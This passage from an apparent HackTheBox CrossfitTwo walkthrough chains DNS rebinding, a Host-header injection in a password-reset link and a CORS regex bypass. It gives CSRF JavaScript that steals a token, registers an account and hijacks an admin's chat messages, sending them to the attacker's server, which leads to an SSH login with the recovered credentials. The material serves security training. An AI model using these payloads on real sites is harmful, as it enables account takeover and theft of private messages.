> Means that we have an A record for rebind.net which evaluates to 1.1.1.1 for the first 10 tries. On the 11th request from a client which has already made 10 requests, FakeDNS starts serving out the second ip, 4.5.6.7

In this case, I’ll want to resolve the first two to localhost, then switch so that when the administrator clicks the link, they visit me:

```

A 0xdf-employees.crossfit.htb 127.0.0.1 2%10.10.14.13

```

I like to run with `sudo tcpdump -ni tun0 udp port 53` running as well to see what’s happening.

I’ll start `nc` listening on 80 to see what kind of response I get, and then send the request again. When FakeDns shows the first two resolutions, `tcpdump` shows they are to 127.0.0.1:

```

16:28:26.331909 IP 10.10.10.232.23252 > 10.10.14.13.53: 57067+ [1au] A? 0xdf-employees.crossfit.htb. (56)
16:28:26.332409 IP 10.10.14.13.53 > 10.10.10.232.23252: 57067* 1/0/0 A 127.0.0.1 (61)
16:28:26.350614 IP 10.10.10.232.2806 > 10.10.14.13.53: 63663+ [1au] A? 0xdf-employees.crossfit.htb. (56)
16:28:26.350971 IP 10.10.14.13.53 > 10.10.10.232.2806: 63663* 1/0/0 A 127.0.0.1 (61)

```

When there’s another request at the DNS server, `tcpdump` shows it resolving to my IP (twice for some reason):

```

16:30:10.832966 IP 10.10.10.232.1827 > 10.10.14.13.53: 26577+ [1au] A? 0xdf-employees.crossfit.htb. (56)
16:30:10.833466 IP 10.10.14.13.53 > 10.10.10.232.1827: 26577* 1/0/0 A 10.10.14.13 (61)
16:30:10.856452 IP 10.10.10.232.22551 > 10.10.14.13.53: 26892+ [1au] A? 0xdf-employees.crossfit.htb. (56)
16:30:10.856815 IP 10.10.14.13.53 > 10.10.10.232.22551: 26892* 1/0/0 A 10.10.14.13 (61)

```

At `nc`, there’s an HTTP request:

```

oxdf@parrot$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.232] 1194
GET /password-reset.php?token=a1c4562f378568a75893411f687a2b73cd632e84df18e57349a9a853cdd326b5328b27303e45ee3ce7c317fd654c3269c9a6e78b9746d45ca307db2269f5f6bc HTTP/1.1
Host: 0xdf-employees.crossfit.htb
User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://crossfit-club.htb/chat
Upgrade-Insecure-Requests: 1

```

At this point I thought I would have access to the admin’s account by visiting that link. I was disappointed to find on visiting:

![image-20210717135839754](https://0xdfimages.gitlab.io/img/image-20210717135839754.png)

#### Trigger Script

I still have the admin coming to visit a page that I’m hosting.

I’m going to build up a script to do the CSRF, but it took me a lot of tries to get it right. Killing and restarting `fakedns.py`, making sure to always forward the zone with `unbound-control` in case it had timed out, and refreshing Firefox got tedious, so I wrote a simple script to trigger the request from the admin:

```

#!/bin/bash    
    
domain="gymxcrossfit.htb"    
ip="10.10.14.13"    
sleep=60      
    
echo "[*] Starting DNS server"    
/opt/FakeDns/fakedns.py -c ./fakedns.conf &    
FAKEDNS=$!    
echo "[*] Forwarding zone"    
sudo unbound-control -s 10.10.10.232 forward_add +i $domain ${ip}@53    
echo "[*] Triggering password reset"    
curl -s -X POST -H "Host: ${domain}/employees.crossfit.htb"  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Referer: http://employees.crossfit.htb/password-reset.php' --data-binary 'email=david.palmer%40crossfit.htb' http://employees.crossfit.htb/password-reset.php | grep 'class="alert' | cut -d'>' -f2 | cut -d'<' -f1
echo -n "[*] Sleeping $sleep seconds waiting for link click starting at: "    
date    
sleep $sleep    
kill $FAKEDNS

```

It starts `fakedns.py` in the background, and records the pid. Then it forwards the zone, then triggers the reset email with `curl`. It sleeps 60 seconds, and then kills `fakedns.py`. My webserver and any other connections I want to catch can be managed in other tmux panes.

#### JavaScript Connect Back

Now that the admin is requesting a page from my IP, I can serve a page containing JavaScript that will make requests. This will end up being a complex set of `XMLHttpRequest` objects, just like in the original [CrossFit](/2021/03/20/htb-crossfit.html#csrf-account-request) machine. I like to build in smaller pieces, so I’ll start with simple JavaScript to make a POST back to me.

I’ll start with a page with script designed to just POST back to my VM:

```

<html>
  <head>
    <title>pwned</title>
  </head>
  <body>
    <script>
      var req = new XMLHttpRequest();
      req.open("POST", "http://0xdf-employees.crossfit.htb/test", false);
      req.send("0xdf was here");
    </script>
  </body>
</html>  

```

With the Python webserver running (`python3 -m http.server 80`), I’ll run the trigger script:

```

oxdf@parrot$ ./trigger.sh 
[*] Starting DNS server
[*] Forwarding zone
>> Parsed 1 rules from ./fakedns.conf
ok
[*] Triggering password reset
>> Matched Request - 0xdf-employees.crossfit.htb.
>> Matched Request - 0xdf-employees.crossfit.htb.
Reset link sent, please check your email.
[*] Sleeping 60 seconds waiting for link click
>> Matched Request - 0xdf-employees.crossfit.htb.

```

That last resolution is the browser click, and there’s a request at the webserver:

```
10.10.10.232 - - [11/Jul/2021 07:02:08] "GET /password-reset.php?token=3eea14906a89827ba66deb4a76fc2e9a131e4c6ad8cdb05e4782c6fa6e691b4c3bc40a6a7a3db51134f6dcc393b96ef4613a15a02cd88afc3d5b580e223aaacc HTTP/1.1" 200 -

```

But I would then expect another POST to `/test`, but it doesn’t come. To test (after making sure to set my `/etc/hosts` file to point `0xdf-employees.crossfit.htb` to my IP), I visited `http://0xdf-employees.crossfit.htb/password-reset.php` in Firefox:

![image-20210711071039023](https://0xdfimages.gitlab.io/img/image-20210711071039023.png)

This is because of the `Content-Type` header Python is including in the HTTP response:

```

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.9.2
Date: Sun, 11 Jul 2021 11:10:25 GMT
Content-type: application/octet-stream
Content-Length: 315
Last-Modified: Sun, 11 Jul 2021 10:49:54 GMT

```

Firefox isn’t sure how to display `application/octet-stream`, so it treats it like a file. If The automation on CrossfitTwo is also using a browser to view the page, then it won’t load the JavaScript and run it.

PHP has a webserver as well, so I’ll try `php -S 0.0.0.0:80`. On refreshing Firefox, there are multiple requests at the PHP webserver, including `/test` which indicates the JavaScript executed:

```

[Sun Jul 11 07:12:55 2021] PHP 7.4.15 Development Server (http://0.0.0.0:80) started
[Sun Jul 11 07:13:21 2021] 10.10.14.13:44486 Accepted
[Sun Jul 11 07:13:21 2021] 10.10.14.13:44486 [200]: GET /password-reset.php
[Sun Jul 11 07:13:21 2021] 10.10.14.13:44486 Closing
[Sun Jul 11 07:13:21 2021] 10.10.14.13:44490 Accepted
[Sun Jul 11 07:13:21 2021] 10.10.14.13:44490 [200]: GET /test
[Sun Jul 11 07:13:21 2021] 10.10.14.13:44490 Closing
[Sun Jul 11 07:13:22 2021] 10.10.14.13:44494 Accepted
[Sun Jul 11 07:13:22 2021] 10.10.14.13:44494 [404]: GET /favicon.ico - No such file or directory
[Sun Jul 11 07:13:22 2021] 10.10.14.13:44494 Closing

```

The response headers show this time the `Content-Type` is `text/html`, which Firefox knows how to display:

```

HTTP/1.1 200 OK
Host: 0xdf-employees.crossfit.htb
Date: Sun, 11 Jul 2021 11:13:21 GMT
Connection: close
X-Powered-By: PHP/7.4.15
Content-type: text/html; charset=UTF-8

```

Interestingly, the PHP server shows the request to `/test` as a GET, but I tried for a POST. It turns out that’s just an error in the webserver. Watching in Wireshark, it’s clearly a POST:

![image-20210711071621488](https://0xdfimages.gitlab.io/img/image-20210711071621488.png)

I’ll re-trigger the exploit and I see the requests come in first for `password-reset.php`, and then for `/test` just like above. It loaded the PHP page and the JavaScript made a request!

#### CORS Bypass

To make the request to `crossfit-club.htb/api/signup`, I need an CSRF token. I’ll update the script to request one, and send it back to make sure it worked. I’ll remember from [Crossfit](/2021/03/20/htb-crossfit.html#csrf-account-request) that I need to use `withCredentials` to keep the cookie the same throughout the entire request, so I’ll add this now.

```

<html>
  <head>
    <title>pwned</title>
  </head>
  <body>
    <script>
      var req_token = new XMLHttpRequest();
      req_token.onreadystatechange = function() {
        if (req_token.readyState == 4) {
          var token = JSON.parse(req_token.response).token
          var req_exfil = new XMLHttpRequest();
          req_exfil.open("POST", "http://0xdf-employees.crossfit.htb:81/exfil", false);
          req_exfil.send(token);
        }
      }
      req_token.open("GET", "http://crossfit-club.htb/api/auth");
      req_token.withCredentials = true;
      req_token.send();
    </script>
  </body>
</html> 

```

It doesn’t work. I see my HTML page requested, but then there’s no POST back to port 81. The request I know does work doesn’t even come back, implying the first one breaks. If I try it locally and look at the Console in the Dev Tools, I can see a potential issue:

![image-20210711133152425](https://0xdfimages.gitlab.io/img/image-20210711133152425.png)

The admin’s browser is visiting `0xdf-employees.crossfit.htb`, and so the single POST back to that domain isn’t an issue. But when I try to make it issue a GET to `crossfit-club.htb`, if that domain doesn’t allow cross origin requests from `0xdf-employees.crossfit.htb`, it will fail and end the JavaScript.

If `crossfit-club.htb` allows cross origin requests from a page, it will have a `Access-Control-Allow-Origin` header in the response to an OPTIONS request. For example, `gym` and `employees` allow for these requests, but the base domain and my spoofed domain do not:

```

oxdf@parrot$ curl -s -X OPTIONS -v -H "Origin: http://crossfit.htb" crossfit-club.htb/api/auth 2>&1 | grep Access-Control-Allow-Origin
oxdf@parrot$ curl -s -X OPTIONS -v -H "Origin: http://0xdf-employees.crossfit.htb" crossfit-club.htb/api/auth 2>&1 | grep Access-Control-Allow-Origin
oxdf@parrot$ curl -s -X OPTIONS -v -H "Origin: http://gym.crossfit.htb" crossfit-club.htb/api/auth 2>&1 | grep Access-Control-Allow-Origin
< Access-Control-Allow-Origin: http://gym.crossfit.htb
oxdf@parrot$ curl -s -X OPTIONS -v -H "Origin: http://employees.crossfit.htb" crossfit-club.htb/api/auth 2>&1 | grep Access-Control-Allow-Origin
< Access-Control-Allow-Origin: http://employees.crossfit.htb

```

The intended trick here (which is very hard to notice) is that often times these CORs allow whitelists will be entered as a series of regular expressions. If that’s the case, then CrossfitTwo could be configured to allow something like:

```

(gym|employees).crossfit.htb

```

Done correctly, those `.` would be escaped as `\.`, but without the escape, they represent any one character. It works because `.` is one character, but it also allows for additional domains. I can test this by looking at another OPTIONS request:

```

oxdf@parrot$ curl -s -X OPTIONS -v -H "Origin: http://employeesXcrossfit.htb" crossfit-club.htb/api/auth 2>&1 | grep Access-Control-Allow-Origin
< Access-Control-Allow-Origin: http://employeesXcrossfit.htb

```

It works!

#### CORS and relayd

Unfortunately, this domain will not be routed by relayd to the site I want to use. How would I use a domain that matched both `*employees.crossfit.htb` and `(gym|employees).crossfit.htb`. The intended trick here again is to think about how each is viewed.

The PHP script that is looking at the `Host` header is parsing it to form the password reset link. It is likely to break the string apart on a special character. But `relayd` isn’t looking at that character, but the entire host, and matching a regex on the end. That means that a request with a `Host` header that’s broken with a `/` could work. To test, I’ll register `gymXcrossfit.htb` with `unbound-control`:

```

oxdf@parrot$ sudo unbound-control -s 10.10.10.232 forward_add +i gymxcrossfit.htb 10.10.14.13@53
ok

```

Now I’ll send the password reset with the following `Host` header:

```

Host: gymxcrossfit.htb/employees.crossfit.htb

```

It worked:

```

14:43:19.562677 IP 10.10.10.232.45069 > 10.10.14.13.53: 21358+ [1au] A? gymxcrossfit.htb. (45)
14:43:19.575908 IP 10.10.14.13.53 > 10.10.10.232.45069: 21358 NXDomain$ 0/6/1 (1024)

```

The request is hitting `relayd` and being routed to the `employees` application because the `Host` header ends with `employees.crossfit.htb`. The application is handling the `Host` header as `gymxcrossfit.htb`, and sending the password reset link to the admin with this domain, which I’ve registered as my own, so the click leads them to my server.

Because the admin’s browser is now visiting `gymxcrossfit.htb`, additional JavaScript requests to `crossfit-club.htb` would only be allowed if it accepts requests from that domain. It does:

```

oxdf@parrot$ curl -s -X OPTIONS -v -H "Origin: http://gymXcrossfit.htb" crossfit-club.htb/api/auth 2>&1 | grep Access-Control-Allow-Origin
< Access-Control-Allow-Origin: http://gymXcrossfit.htb

```

#### Fetch Token

With all that in mind, I’ll update my files to reflect the new domain.

`password-reset.php`:

```

<html>
  <head>
    <title>pwned</title>
  </head>
  <body>
    <script>
      var req_token = new XMLHttpRequest();
      req_token.onreadystatechange = function() {
        if (req_token.readyState == 4) {
          var token = JSON.parse(req_token.response).token
          var req_exfil = new XMLHttpRequest();
          req_exfil.open("POST", "http://gymxcrossfit.htb:81/exfil", false);
          req_exfil.send(token);
        }
      }
      req_token.open("GET", "http://crossfit-club.htb/api/auth");
      req_token.withCredentials = true;
      req_token.send();
    </script>
  </body>
</html>

```

`trigger.sh`:

```

#!/bin/bash

domain="gymxcrossfit.htb"
sleep=180

echo "[*] Starting DNS server"
/opt/FakeDns/fakedns.py -c ./fakedns.conf &
FAKEDNS=$!
echo "[*] Forwarding zone"
sudo unbound-control -s 10.10.10.232 forward_add +i $domain 10.10.14.13@53
echo "[*] Triggering password reset"
curl -s -X POST -H "Host: ${domain}/employees.crossfit.htb"  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Referer: http://employees.crossfit.htb/password-reset.php' --data-binary 'email=david.palmer%40crossfit.htb' http://employees.crossfit.htb/password-reset.php | grep 'class="alert' | cut -d'>' -f2 | cut -d'<' -f1
echo "[*] Sleeping $sleep seconds waiting for link click"
sleep $sleep
kill $FAKEDNS 

```

Running that returns a token to the `nc` listening on 81:

```

oxdf@parrot$ nc -lnvp 81
listening on [any] 81 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.232] 8010
POST /exfil HTTP/1.1
Host: gymxcrossfit.htb:81
User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 36
Origin: http://gymxcrossfit.htb
Connection: keep-alive
Referer: http://gymxcrossfit.htb/password-reset.php?token=f62cc32e31940141fde843ff01fc43cca36b374b66dfdeb011d789b2ae6c12994a4c140e5d4136e642f7cfba41b485ecddbb4ec0e4e490de644eb1120204efd6

iqvDUFy9-oGWUv-59IYoxsjlZGtnrPDSZzZ0

```

#### Register

Now that I can fetch a token, I’ll try to use it to register a user on the site. I don’t have an example of this request because it was removed from the site. But based on what I found above, I have the field names from the form, and I can assume it uses the same format as the `/api/login` POST.

I’ll add more JavaScript to try that request:

```

<html>
  <head>
    <title>pwned</title>
  </head>
  <body>
    <script>
      var req_token = new XMLHttpRequest();
      req_token.onreadystatechange = function() {
        if (req_token.readyState == 4) {
          // With token, proceed to register
          var token = JSON.parse(req_token.response).token;
          var req_register = new XMLHttpRequest();
          req_register.onreadystatechange = function() {
            if (req_register.readyState == 4) {
              // Once registration returns, send result back
              var req_exfil = new XMLHttpRequest();
              req_exfil.open("POST", "http://gymxcrossfit.htb:81/exfil", false);
              req_exfil.send("resp: " + req_register.response);
            }
          }
          req_register.open("POST", "http://crossfit-club.htb/api/signup")
          req_register.withCredentials = true;
          req_register.setRequestHeader('X-CSRF-TOKEN', token);
          req_register.setRequestHeader('Content-Type', 'application/json');
          req_register.send('{"username": "0xdf", "email": "0xdf@developer.htb", "password": "0xdf0xdf", "confirm": "0xdf0xdf"}');
        }
      }
      req_token.open("GET", "http://crossfit-club.htb/api/auth");
      req_token.withCredentials = true;
      req_token.send();
    </script>
  </body>
</html>  

```

I’ll run the trigger script again. After a couple minutes, the request comes to the PHP server, and then immediately I get a request at `nc` on TCP 81:

```

POST /exfil HTTP/1.1
Host: gymxcrossfit.htb:81
User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 66
Origin: http://gymxcrossfit.htb
Connection: keep-alive
Referer: http://gymxcrossfit.htb/password-reset.php?token=b78384a95b787a190448b79f6e7d8823ac6f8a0a73c5552ba2225fe5bee6a85c6c7f7cca7bd9eb44f03af81c9a09b14d91ed4062de06acd56887274fcb09a0cc                      

{"success":"true","message":"User registered successfully!"}

```

The account works, and I’m able to log in!

### Capture Admin’s Messages

#### Site Enumeration

Logged in, there’s a main page with a couple posts:

![image-20210719091645314](https://0xdfimages.gitlab.io/img/image-20210719091645314.png)

All the links lead here, except for Chat, which leads to a chat application. On first visiting, there are users down the left, including Global Chat and Admin:

![image-20210719092520149](https://0xdfimages.gitlab.io/img/image-20210719092520149.png)

After a minute or so, chats start coming into the global chat:

![image-20210719092926545](https://0xdfimages.gitlab.io/img/image-20210719092926545.png)

#### Tech Stack

After logging in, the History tab in Burp started filling up with requests to `/socket.io`:

![image-20210719093519597](https://0xdfimages.gitlab.io/img/image-20210719093519597.png)

They seem to cycle about every 25 seconds. This looks to be an instance built on [Socket.IO](https://socket.io/). I’ll scroll up to look at what happens immediately after authenticating.

First, immediately after the call to `/api/auth`, there’s a GET to `/socket.io/?EIO=3&transport=polling&t=Ng-iqHu` which returns:

```

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Connection: close
Content-Length: 88
Content-Type: text/plain; charset=UTF-8
Date: Mon, 19 Jul 2021 12:21:44 GMT
Set-Cookie: io=dELk6uRjhMM2cMa8AAJI; Path=/; HttpOnly; SameSite=Strict

85:0{"sid":"dELk6uRjhMM2cMa8AAJI","upgrades":[],"pingInterval":25000,"pingTimeout":5000}

```

That `sid` is used as a cookie named `io` in future connections. It also confirms that 25 second polling interval I noticed above.

Next my browser sends a POST with a `user_join` message:

```

POST /socket.io/?EIO=3&transport=polling&t=Ng_i3Yu&sid=aghc8LZrK7x2H1XmAACb HTTP/1.1
Host: crossfit-club.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: text/plain;charset=UTF-8
Content-Length: 38
Origin: http://crossfit-club.htb
DNT: 1
Connection: close
Referer: http://crossfit-club.htb/chat
Cookie: connect.sid=s%3AT4BU0E1aVej9NWQZf598w6lPx-yUVTtW.l9mGam52pncFR6TlKbOX%2FjDYNTv7EUxQaYb8W7atE%2FI; io=aghc8LZrK7x2H1XmAACb

35:42["user_join",{"username":"0xdf"}]

```

The next message has a message with the state of all the users:

```

71:42["new_user",{"_id":25,"username":"0xdf","status":{"state":"online"}}]487:42["participants",[{"_id":2,"username":"John","status":{"state":"online"}},{"_id":11,"username":"Lucille","status":{"state":"online"}},{"_id":12,"username":"Boris","status":{"state":"online"}},{"_id":13,"username":"Pepe","status":{"state":"online"}},{"_id":14,"username":"Polarbear","status":{"state":"online"}},{"_id":15,"username":"Minato","status":{"state":"online"}},{"_id":1,"username":"Admin","status":{"state":"offline"}},{"_id":25,"username":"0xdf","status":{"state":"online"}}]]

```

On sending a message to the the Global Chat, it sends a POST:

```

POST /socket.io/?EIO=3&transport=polling&t=Ng_R6Zq&sid=Tle-D_Iy1lte1w7wAAAU HTTP/1.1
Host: crossfit-club.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: text/plain;charset=UTF-8
Content-Length: 95
Origin: http://crossfit-club.htb
DNT: 1
Connection: close
Referer: http://crossfit-club.htb/chat
Cookie: connect.sid=s%3AT4BU0E1aVej9NWQZf598w6lPx-yUVTtW.l9mGam52pncFR6TlKbOX%2FjDYNTv7EUxQaYb8W7atE%2FI; io=Tle-D_Iy1lte1w7wAAAU

92:42["global_message",{"sender_id":"Tle-D_Iy1lte1w7wAAAU","content":"test","roomId":"global"}]

```

Messages from others come in as responses to the polling requests from my browser:

```

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Connection: close
Content-Length: 176
Content-Type: text/plain; charset=UTF-8
Date: Mon, 19 Jul 2021 12:22:51 GMT
Set-Cookie: io=dELk6uRjhMM2cMa8AAJI; Path=/; HttpOnly; SameSite=Strict

172:42["recv_global",{"sender_id":13,"content":"Wow! There are more tigers living as pets in the USA than living wild in asia.","roomId":"global","_id":2309,"username":"Pepe"}]

```

When I send a private message to a user, it goes out in one of the periodic POSTs with a body:

```

92:42["private_message",{"sender_id":"aghc8LZrK7x2H1XmAACb","content":"hello john","roomId":2}]

```

None of the users reply to my DMs. To see what receiving a DM looked like, I phished the admin again to create a second user. In Chromium, I’ll log in as that user. To see what receiving a DM looks like, I’ll message 0xdf from 0xdf2:

![image-20210719130113394](https://0xdfimages.gitlab.io/img/image-20210719130113394.png)

The message that comes back in Burp (which is only intercepting Firefox logged in as 0xdf) looks like:

```

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Connection: close
Content-Length: 83
Content-Type: text/plain; charset=UTF-8
Date: Mon, 19 Jul 2021 17:05:12 GMT
Set-Cookie: io=aghc8LZrK7x2H1XmAACb; Path=/; HttpOnly; SameSite=Strict

80:42["private_recv",{"sender_id":26,"content":"hello 0xdf","roomId":26,"_id":602}]

```

#### Hijack Messages [Local]

I’m going to write a dummy JavaScript application that connects to the Socket.IO as Admin. From everything I can tell looking at the documentation and the requests that in Burp, as long as the `connect.sid` cookie matches the username sent in the `user_join` message, it will then start to send down messages.

I’ll create a simple HTML page that I can run locally to test. IT will need to do three things:
1. Create the `socket` object and connect it to `crossfit-club.htb`.
2. Set up a handler to act when `private_recv` messages come in.
3. Send a `user_join` message to initiate the client into the stream.

```

<html>
 <script src="http://crossfit-club.htb/socket.io/socket.io.js"></script> 
 <script>
   var socket = io("http://crossfit-club.htb", {       
     transports: ["polling"],  
     withCredentials: true,  
   });
   socket.on("private_recv", function(msg) {    
     console.log(msg); 
   });
   socket.emit("user_join", { username : "0xdf" });    
 </script>
</html>

```

This local POC is telling the system my username is 0xdf, as my browser has a copy of the cookie associated with that name. I’ll load the page in Firefox (it’s empty, as expected), and then open the console in dev tools. From Chromium (logged in as 0xdf2), I’ll send a message to 0xdf:

![image-20210719133236642](https://0xdfimages.gitlab.io/img/image-20210719133236642.png)

The message comes in in the legit chat:

![image-20210719133255490](https://0xdfimages.gitlab.io/img/image-20210719133255490.png)

It also shows up in the dev tools console on the hijacked page:

![image-20210719133321546](https://0xdfimages.gitlab.io/img/image-20210719133321546.png)

#### Hijack Message [Remote]

I’ll update the script two ways. First, I’ll switch the user to Admin. Second, exfil via HTTP requests rather than just posting to the console. I’m going with a GET request with the data base64 encoded in the url because it turns out I need to get multiple messages before I get the one that’s interesting, and trying to catch a bunch with `nc` was causing issues.

```

<html>
 <script src="http://crossfit-club.htb/socket.io/socket.io.js"></script>
 <script>
   var socket = io("http://crossfit-club.htb", {
     transports: ["polling"],
     withCredentials: true,
   });
   socket.on("private_recv", function(msg) {
     var req = new XMLHttpRequest();
     req.open("GET", "http://gymxcrossfit.htb/exfil/" + btoa(JSON.stringify(msg)), true);
     req.send();
   });
   socket.emit("user_join", { username : "Admin" });
 </script>
</html>

```

I’ll trigger again, this time with a longer timeout to let the DNS run longer:

```

oxdf@parrot$ ./trigger.sh 
[*] Starting DNS server
[*] Forwarding zone
>> Parsed 2 rules from ./fakedns.conf
ok
[*] Triggering password reset
>> Matched Request - gymxcrossfit.htb.
>> Matched Request - gymxcrossfit.htb.
Reset link sent, please check your email.
[*] Sleeping 6000 seconds waiting for link click starting at: Mon 19 Jul 2021 02:37:40 PM EDT

```

First comes the request for the HTML:

```

[Mon Jul 19 14:39:42 2021] 10.10.10.232:3577 Accepted
[Mon Jul 19 14:39:42 2021] 10.10.10.232:3577 [200]: GET /password-reset.php?token=41339f3069c6f4e4dfa8c107a108579e6fd20db0dea41f3d270dcb39dbda828c9e69e31b9f715b50eec10c0ccfbbc1d74b63bc38f72df7655e83f153ad086f12
[Mon Jul 19 14:39:42 2021] 10.10.10.232:3577 Closing
[Mon Jul 19 14:39:43 2021] 10.10.10.232:31539 Accepted
[Mon Jul 19 14:39:43 2021] 10.10.10.232:31539 [404]: GET /favicon.ico - No such file or directory
[Mon Jul 19 14:39:43 2021] 10.10.10.232:31539 Closing

```

After that, there are messages that come in slowly:

```

[Mon Jul 19 14:40:32 2021] 10.10.10.232:30633 Accepted
[Mon Jul 19 14:40:32 2021] 10.10.10.232:30633 [404]: GET /exfil/eyJzZW5kZXJfaWQiOjExLCJjb250ZW50IjoiSSBmZWVsIHNvIHRpcmVkIGFmdGVyIHRvZGF5J3Mgd29ya291dC4iLCJyb29tSWQiOjExLCJfaWQiOjkwOH0= - No such file or directory
[Mon Jul 19 14:40:32 2021] 10.10.10.232:30633 Closing
[Mon Jul 19 14:40:42 2021] 10.10.10.232:32260 Accepted
[Mon Jul 19 14:40:42 2021] 10.10.10.232:32260 [404]: GET /exfil/eyJzZW5kZXJfaWQiOjIsImNvbnRlbnQiOiJIZWxsbyBEYXZpZCwgSSd2ZSBhZGRlZCBhIHVzZXIgYWNjb3VudCBmb3IgeW91IHdpdGggdGhlIHBhc3N3b3JkIGBOV0JGY1NlM3dzNFZEaFRCYC4iLCJyb29tSWQiOjIsIl9pZCI6OTA5fQ== - No such file or directory
[Mon Jul 19 14:40:42 2021] 10.10.10.232:32260 Closing
[Mon Jul 19 14:41:24 2021] 10.10.10.232:34902 Accepted
[Mon Jul 19 14:41:24 2021] 10.10.10.232:34902 [404]: GET /exfil/eyJzZW5kZXJfaWQiOjEyLCJjb250ZW50IjoiSGVsbG8gc2lyLCBjYW4geW91IGhhY2sgaW5zdGEgcGxzPyIsInJvb21JZCI6MTIsIl9pZCI6OTEwfQ== - No such file or directory
[Mon Jul 19 14:41:24 2021] 10.10.10.232:34902 Closing
[Mon Jul 19 14:41:54 2021] 10.10.10.232:34850 Accepted
[Mon Jul 19 14:41:54 2021] 10.10.10.232:34850 [404]: GET /exfil/eyJzZW5kZXJfaWQiOjIsImNvbnRlbnQiOiJIZWxsbyBEYXZpZCwgSSd2ZSBhZGRlZCBhIHVzZXIgYWNjb3VudCBmb3IgeW91IHdpdGggdGhlIHBhc3N3b3JkIGBOV0JGY1NlM3dzNFZEaFRCYC4iLCJyb29tSWQiOjIsIl9pZCI6OTEyfQ== - No such file or directory
[Mon Jul 19 14:41:54 2021] 10.10.10.232:34850 Closing
[Mon Jul 19 14:42:15 2021] 10.10.10.232:5398 Accepted
[Mon Jul 19 14:42:15 2021] 10.10.10.232:5398 [404]: GET /exfil/eyJzZW5kZXJfaWQiOjE0LCJjb250ZW50IjoiU29tZW9uZSBidWlsdCBhIHdvcmtpbmcgMTYgYml0IGNvbXB1dGVyIHVzaW5nIG5vdGhpbmcgYnV0IHRoZSBiYXNpYyBNaW5lY3JhZnQgYnVpbGRpbmcgYmxvY2tzLiBJIHdvbmRlciB3aGF0IGtpbmQgd2FycmFudHkgdGhhdCBvbmUgaGFzPyEiLCJyb29tSWQiOjE0LCJfaWQiOjkxNH0= - No such file or directory
[Mon Jul 19 14:42:15 2021] 10.10.10.232:5398 Closing

```

Decoding them, one is really interesting:

```

oxdf@parrot$ echo "eyJzZW5kZXJfaWQiOjIsImNvbnRlbnQiOiJIZWxsbyBEYXZpZCwgSSd2ZSBhZGRlZCBhIHVzZXIgYWNjb3VudCBmb3IgeW91IHdpdGggdGhlIHBhc3N3b3JkIGBOV0JGY1NlM3dzNFZEaFRCYC4iLCJyb29tSWQiOjIsIl9pZCI6ODY2fQ==" | base64 -d
{"sender_id":2,"content":"Hello David, I've added a user account for you with the password `NWBFcSe3ws4VDhTB`.","roomId":2,"_id":866}

```

### SSH

Those creds work for SSH into CrossfitTwo:

```

oxdf@parrot$ sshpass -p 'NWBFcSe3ws4VDhTB' ssh david@10.10.10.232
...[snip]...
crossfit2:david {1}

```

The shell is actually `csh`:

```

crossfit2:david {1} echo $SHELL
/bin/csh

```

It doesn’t allow for up arrow history, but switching to `sh` does:

```

crossfit2:david {2} sh    
crossfit2$ 

```

And I can grab `user.txt`:

```

crossfit2$ cat user.txt
652b4016************************

```

## Shell as john

### Enumeration

#### Homedirs

david’s home directory is basically empty outside of `user.txt`.

There are three other home directories, but I can’t access any of them:

```

crossfit2$ ls
david   john    lucille node
crossfit2$ ls john/
ls: john/: Permission denied
crossfit2$ ls lucille/
ls: lucille/: Permission denied
crossfit2$ ls node/
ls: node/: Permission denied

```

#### /opt

There’s a `sysadmins` directory in `/opt` which is owned by root and the sysadmins group, which david is in:

```

crossfit2$ cd opt/
crossfit2$ ls -la
total 12
drwxr-xr-x   3 root  wheel      512 Jan 13  2021 .
drwxr-xr-x  15 root  wheel      512 Jul 19 14:25 ..
drwxrwxr-x   3 root  sysadmins  512 Feb  3 04:45 sysadmin
crossfit2$ id
uid=1004(david) gid=1004(david) groups=1004(david), 1003(sysadmins)

```

A few more directories down, there’s a single file, `statbot.js`:

```

crossfit2$ find /opt -type f -ls
1244161    4 -rw-r--r--    1 root     wheel         740 Jan 13  2021 /opt/sysadmin/server/statbot/statbot.js

```

The script creates a websocket connection to `ws://gym.crossfit.htb/ws`, and then writes a log to `/tmp/chatbot.log` as to if it was up:

```

const WebSocket = require('ws');
const fs = require('fs');
const logger = require('log-to-file');
const ws = new WebSocket("ws://gym.crossfit.htb/ws/");
function log(status, connect) {
  var message;
  if(status) {
    message = `Bot is alive`;
  }
  else {
    if(connect) {
      message = `Bot is down (failed to connect)`;
    }
    else {
      message = `Bot is down (failed to receive)`;
    }
  }
  logger(message, '/tmp/chatbot.log');
}
ws.on('error', function err() {
  ws.close();
  log(false, true);
})
ws.on('message', function message(data) {
  data = JSON.parse(data);
  try {
    if(data.status === "200") {
      ws.close()
      log(true, false);
    }
  }
  catch(err) {
      ws.close()
      log(false, false);
  }
});

```

The `chatbot.log` file was written less than a minute ago and is owned by john, which is a good sign that this script is being run as john (some analysis shows every minute):

```

crossfit2$ ls -l /tmp/chatbot.log
